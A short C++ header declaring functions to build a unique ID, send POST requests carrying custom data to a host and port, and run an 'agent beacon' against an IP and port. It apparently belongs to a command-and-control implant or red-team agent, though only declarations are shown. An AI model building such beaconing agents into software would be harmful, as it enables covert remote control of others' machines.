#pragma once
#include <string>
#include <iostream>
#include <thread>
#include <chrono>

using namespace std;

string buildUniqueID();

bool sendPostRequest(const string& host, int port, const string& path, 
                     const string& customData, const string& uniqueID, char validate);

void agentbeaconFunction(const string& ip, int port);